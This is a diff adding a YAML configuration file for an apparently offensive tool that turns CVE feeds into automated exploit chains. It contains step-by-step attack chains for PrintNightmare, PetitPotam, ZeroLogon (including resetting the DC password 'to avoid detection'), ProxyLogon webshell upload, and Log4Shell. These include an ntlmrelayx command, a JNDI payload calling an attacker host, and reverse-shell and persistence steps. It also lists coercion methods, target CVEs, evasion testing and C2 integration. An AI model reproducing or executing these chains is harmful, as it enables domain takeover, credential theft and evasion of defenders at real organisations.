@@ -1,0 +1,491 @@
+# =============================================================================
+# Zero-Day Exploit Integrator Configuration
+# =============================================================================
+# Real-time CVE integration, AI risk scoring, and auto-exploit chain generation
+# Version: 2.0.0
+
+zero_day:
+  # NVD API Configuration
+  nvd_api_key: ""  # Get from https://nvd.nist.gov/developers/request-an-api-key
+  nvd_api_url: "https://services.nvd.nist.gov/rest/json/cves/2.0"
+  
+  # Exploit Sources
+  exploit_db_url: "https://www.exploit-db.com"
+  github_search_url: "https://api.github.com/search/code"
+  nuclei_templates_url: "https://github.com/projectdiscovery/nuclei-templates"
+  
+  # Cache Settings
+  cache_ttl: 3600  # 1 hour cache for CVE data
+  max_results: 100
+  
+  # Feature Toggles
+  auto_fetch_exploits: true
+  enable_ai_scoring: true
+  enable_relay_integration: true
+  enable_chain_generation: true
+  
+  # Severity Filtering
+  severity_threshold: "HIGH"  # Minimum severity to alert (CRITICAL, HIGH, MEDIUM, LOW)
+  
+  # Monitoring Settings
+  monitor_enabled: true
+  monitor_interval: 300  # Check every 5 minutes
+  webhook_url: ""  # Slack/Discord webhook for alerts
+  
+  # Target Vendors to Monitor
+  target_vendors:
+    - microsoft
+    - linux
+    - cisco
+    - vmware
+    - fortinet
+    - palo_alto
+    - citrix
+
+# =============================================================================
+# AI Risk Scoring Configuration
+# =============================================================================
+ai_scoring:
+  enabled: true
+  
+  # Weight Configuration (must sum to 1.0)
+  weights:
+    cvss_score: 0.25
+    exploitability: 0.20
+    impact: 0.15
+    vendor_criticality: 0.15
+    exploit_availability: 0.15
+    recency: 0.10
+  
+  # Alert Thresholds
+  alert_thresholds:
+    critical: 80  # Score >= 80 = Critical alert
+    high: 60      # Score >= 60 = High alert
+    medium: 40    # Score >= 40 = Medium alert
+    low: 20       # Score >= 20 = Low alert
+  
+  # Vendor Criticality Scores (0.0 - 1.0)
+  vendor_criticality:
+    microsoft: 0.95
+    linux: 0.90
+    cisco: 0.85
+    vmware: 0.85
+    fortinet: 0.90
+    palo_alto: 0.90
+    citrix: 0.85
+    oracle: 0.75
+    apache: 0.80
+    adobe: 0.70
+    solarwinds: 0.80
+    atlassian: 0.75
+    other: 0.50
+  
+  # Exploit Status Scores (0.0 - 1.0)
+  exploit_status_scores:
+    in_the_wild: 1.0
+    weaponized: 0.9
+    poc_only: 0.7
+    available: 0.6
+    theoretical: 0.3
+    patched: 0.1
+  
+  # Exploit Type Scores (0.0 - 1.0)
+  exploit_type_scores:
+    rce: 1.0
+    privesc: 0.9
+    auth_bypass: 0.85
+    relay: 0.85
+    kerberos: 0.85
+    printer: 0.80
+    cmdi: 0.80
+    sqli: 0.75
+    deserialization: 0.75
+    ssrf: 0.70
+    xxe: 0.65
+    path_traversal: 0.60
+    info_leak: 0.50
+    dos: 0.40
+
+# =============================================================================
+# Exploit Chain Templates
+# =============================================================================
+exploit_chains:
+  # PrintNightmare to Domain Admin
+  printer_to_domain:
+    name: "Printer Bug to Domain Admin"
+    description: "Coerce authentication via printer bug, relay to ADCS/LDAP for domain compromise"
+    cves:
+      - "CVE-2021-34527"
+      - "CVE-2021-1675"
+    target_type: "active_directory"
+    success_rate: 0.85
+    steps:
+      - action: enumerate
+        target: dc
+        description: "Find domain controllers with Print Spooler enabled"
+        tool: "rpcdump.py"
+      - action: setup
+        target: relay
+        description: "Start ntlmrelayx with ADCS/LDAP target"
+        tool: "ntlmrelayx.py"
+      - action: coerce
+        method: printerbug
+        description: "Trigger printer bug authentication callback"
+        tool: "printerbug.py"
+      - action: relay
+        target: adcs
+        description: "Relay authentication to AD Certificate Services"
+      - action: extract
+        target: certificate
+        description: "Obtain domain admin certificate via ESC8"
+      - action: authenticate
+        method: pkinit
+        description: "Authenticate with certificate for TGT"
+        tool: "gettgtpkinit.py"
+  
+  # PetitPotam ESC8
+  petitpotam_esc8:
+    name: "PetitPotam to ESC8"
+    description: "Coerce DC via EFS, relay to ADCS web enrollment"
+    cves:
+      - "CVE-2021-36942"
+    target_type: "active_directory"
+    success_rate: 0.90
+    steps:
+      - action: setup
+        target: ntlmrelayx
+        description: "Start relay to ADCS web enrollment"
+        command: "ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController"
+      - action: coerce
+        method: petitpotam
+        description: "Trigger EFS coercion to DC"
+        tool: "petitpotam.py"
+      - action: relay
+        target: adcs_web
+        description: "Relay DC authentication to ADCS"
+      - action: request
+        target: certificate
+        description: "Request DC certificate"
+      - action: dcsync
+        method: certificate
+        description: "DCSync using DC certificate"
+        tool: "secretsdump.py"
+  
+  # ZeroLogon Chain
+  zerologon_chain:
+    name: "ZeroLogon Full Chain"
+    description: "Reset DC password, extract secrets, restore"
+    cves:
+      - "CVE-2020-1472"
+    target_type: "active_directory"
+    success_rate: 0.95
+    steps:
+      - action: exploit
+        method: zerologon
+        description: "Reset DC machine account password"
+        tool: "zerologon_tester.py"
+      - action: extract
+        target: ntds
+        description: "Extract NTDS.dit using empty password"
+        tool: "secretsdump.py"
+      - action: crack
+        target: hashes
+        description: "Crack extracted hashes"
+        tool: "hashcat"
+      - action: restore
+        target: dc_password
+        description: "Restore DC password to avoid detection"
+        tool: "restorepassword.py"
+  
+  # ProxyLogon Chain
+  proxylogon_chain:
+    name: "ProxyLogon RCE Chain"
+    description: "Exchange RCE for initial access, pivot to DC"
+    cves:
+      - "CVE-2021-26855"
+      - "CVE-2021-27065"
+    target_type: "exchange"
+    success_rate: 0.80
+    steps:
+      - action: exploit
+        method: proxylogon
+        description: "SSRF to backend authentication"
+        tool: "proxylogon.py"
+      - action: upload
+        target: webshell
+        description: "Upload webshell via arbitrary file write"
+      - action: enumerate
+        target: network
+        description: "Enumerate internal network from Exchange"
+      - action: pivot
+        target: dc
+        description: "Pivot to domain controller"
+      - action: extract
+        target: credentials
+        description: "Extract credentials for domain access"
+
+  # Log4Shell Chain
+  log4shell_chain:
+    name: "Log4Shell Initial Access"
+    description: "Log4j RCE for initial foothold"
+    cves:
+      - "CVE-2021-44228"
+      - "CVE-2021-45046"
+    target_type: "java_application"
+    success_rate: 0.75
+    steps:
+      - action: setup
+        target: ldap_server
+        description: "Start malicious LDAP server with payload"
+        tool: "rogue-jndi"
+      - action: inject
+        method: jndi
+        description: "Inject JNDI lookup payload"
+        payload: "${jndi:ldap://attacker:1389/exploit}"
+      - action: execute
+        target: reverse_shell
+        description: "Execute reverse shell payload"
+      - action: persist
+        method: cron
+        description: "Establish persistence via cron/systemd"
+
+# =============================================================================
+# Relay Coercion Methods (Relay Ninja Integration)
+# =============================================================================
+coercion_methods:
+  printnightmare:
+    cve: "CVE-2021-34527"
+    method: "RpcRemoteFindFirstPrinterChangeNotificationEx"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\spoolss"
+    requires_auth: false
+    dc_only: false
+    
+  printerbug:
+    cve: "CVE-2021-1675"
+    method: "RpcRemoteFindFirstPrinterChangeNotification"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\spoolss"
+    requires_auth: true
+    dc_only: false
+    
+  petitpotam:
+    cve: "CVE-2021-36942"
+    method: "EfsRpcOpenFileRaw"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\efsrpc"
+    requires_auth: false
+    dc_only: false
+    
+  efspotato:
+    cve: "CVE-2021-36942"
+    method: "EfsRpcOpenFileRaw"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\lsarpc"
+    requires_auth: true
+    dc_only: false
+    
+  shadowcoerce:
+    cve: "CVE-2022-30213"
+    method: "IsPathShadowCopied"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\FssagentRpc"
+    requires_auth: true
+    dc_only: false
+    
+  dfscoerce:
+    cve: "CVE-2022-26925"
+    method: "NetrDfsRemoveStdRoot"
+    port: 445
+    protocol: "SMB"
+    pipe: "\\pipe\\netdfs"
+    requires_auth: true
+    dc_only: false
+    
+  coercer:
+    cve: "Multiple"
+    method: "Multiple RPC methods"
+    port: 445
+    protocol: "SMB"
+    pipes:
+      - "\\pipe\\spoolss"
+      - "\\pipe\\efsrpc"
+      - "\\pipe\\lsarpc"
+      - "\\pipe\\FssagentRpc"
+      - "\\pipe\\netdfs"
+    requires_auth: false
+    dc_only: false
+
+# =============================================================================
+# High-Value Target CVEs
+# =============================================================================
+high_value_targets:
+  print_spooler:
+    name: "Windows Print Spooler"
+    cves:
+      - "CVE-2021-34527"  # PrintNightmare RCE
+      - "CVE-2021-1675"   # PrintNightmare LPE
+      - "CVE-2022-22718"  # Print Spooler Elevation
+      - "CVE-2022-30206"  # Print Spooler RCE
+    relay_compatible: true
+    
+  exchange:
+    name: "Microsoft Exchange"
+    cves:
+      - "CVE-2021-26855"  # ProxyLogon SSRF
+      - "CVE-2021-27065"  # ProxyLogon File Write
+      - "CVE-2021-34473"  # ProxyShell ACL Bypass
+      - "CVE-2022-41082"  # ProxyNotShell RCE
+    relay_compatible: false
+    
+  active_directory:
+    name: "Active Directory"
+    cves:
+      - "CVE-2020-1472"   # ZeroLogon
+      - "CVE-2021-42287"  # sAMAccountName Spoofing
+      - "CVE-2022-26923"  # AD CS Privilege Escalation
+      - "CVE-2022-33679"  # Kerberos RC4-MD4 Bypass
+    relay_compatible: true
+    
+  smb:
+    name: "SMB Protocol"
+    cves:
+      - "CVE-2017-0144"   # EternalBlue
+      - "CVE-2020-0796"   # SMBGhost
+      - "CVE-2022-24500"  # SMB Client RCE
+    relay_compatible: false
+    
+  rdp:
+    name: "Remote Desktop"
+    cves:
+      - "CVE-2019-0708"   # BlueKeep
+      - "CVE-2019-1181"   # DejaBlue
+      - "CVE-2019-1182"   # DejaBlue
+    relay_compatible: false
+    
+  netlogon:
+    name: "Netlogon"
+    cves:
+      - "CVE-2020-1472"   # ZeroLogon
+    relay_compatible: false
+    
+  log4j:
+    name: "Apache Log4j"
+    cves:
+      - "CVE-2021-44228"  # Log4Shell
+      - "CVE-2021-45046"  # Log4Shell Bypass
+      - "CVE-2021-45105"  # Log4j DoS
+    relay_compatible: false
+    
+  vmware:
+    name: "VMware Products"
+    cves:
+      - "CVE-2021-21985"  # vCenter RCE
+      - "CVE-2022-22954"  # Workspace ONE RCE
+      - "CVE-2022-22960"  # Workspace ONE LPE
+    relay_compatible: false
+    
+  fortinet:
+    name: "Fortinet Products"
+    cves:
+      - "CVE-2022-40684"  # FortiOS Auth Bypass
+      - "CVE-2023-27997"  # FortiOS Heap Overflow
+      - "CVE-2024-21762"  # FortiOS Out-of-bounds Write
+    relay_compatible: false
+    
+  citrix:
+    name: "Citrix Products"
+    cves:
+      - "CVE-2019-19781"  # Citrix ADC RCE
+      - "CVE-2023-3519"   # Citrix ADC RCE
+      - "CVE-2023-4966"   # Citrix Bleed
+    relay_compatible: false
+
+# =============================================================================
+# Alerting Configuration
+# =============================================================================
+alerting:
+  enabled: true
+  
+  # Alert Channels
+  channels:
+    webhook:
+      enabled: false
+      url: ""
+      format: "json"
+    
+    slack:
+      enabled: false
+      webhook_url: ""
+      channel: "#security-alerts"
+    
+    discord:
+      enabled: false
+      webhook_url: ""
+    
+    email:
+      enabled: false
+      smtp_server: ""
+      smtp_port: 587
+      from_address: ""
+      to_addresses: []
+      use_tls: true
+  
+  # Alert Templates
+  templates:
+    critical_cve: |
+      🚨 CRITICAL CVE DETECTED
+      CVE: {cve_id}
+      CVSS: {cvss_score}
+      AI Risk Score: {ai_risk_score}
+      Description: {description}
+      Exploit Status: {exploit_status}
+      Recommendation: Immediate patching required
+    
+    high_cve: |
+      ⚠️ HIGH SEVERITY CVE
+      CVE: {cve_id}
+      CVSS: {cvss_score}
+      AI Risk Score: {ai_risk_score}
+      Vendor: {vendor}
+
+# =============================================================================
+# Integration Settings
+# =============================================================================
+integrations:
+  # Relay Ninja Integration
+  relay_ninja:
+    enabled: true
+    auto_add_coercions: true
+    config_path: "configs/relay_ninja_config.yaml"
+  
+  # AI Lateral Guide Integration
+  ai_lateral_guide:
+    enabled: true
+    suggest_exploits: true
+    auto_chain: true
+  
+  # Evasion Testing Integration
+  evasion_testing:
+    enabled: true
+    test_generated_payloads: true
+  
+  # C2 Integration
+  c2_framework:
+    enabled: false
+    auto_deploy_exploits: false
+
+# =============================================================================
+# Logging Configuration
+# =============================================================================
+logging:
+  level: "INFO"  # DEBUG, INFO, WARNING, ERROR
+  file: "logs/zero_day.log"
+  max_size_mb: 100
+  backup_count: 5
+  format: "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
